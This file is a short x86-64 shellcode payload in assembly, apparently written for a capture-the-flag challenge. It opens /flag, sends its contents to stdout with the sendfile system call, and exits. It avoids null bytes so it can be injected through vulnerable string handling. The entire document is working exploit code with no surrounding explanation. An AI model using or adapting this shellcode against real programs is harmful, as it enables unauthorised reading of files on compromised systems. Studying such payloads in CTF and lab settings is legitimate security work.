# This shellcode prints the file at /flag to stdout
# It has no 0x00 byte in it.
.intel_syntax noprefix
# open /flag
xor rax, rax
inc rax
inc rax
mov rbx, 0x01010167616c662f
push rbx
mov rdi, rsp
dec BYTE PTR [rsp+5]
xor rsi, rsi
syscall

# sendfile
mov rsi, rax
xor rdi, rdi
inc rdi
xor rdx, rdx
xor rax, rax
mov al, 0xff
mov r10, rax
xor rax, rax
mov al, 40
syscall

# exit
xor rax, rax
mov al, 7
mov rdi, rax
xor rax, rax
mov al, 60
syscall
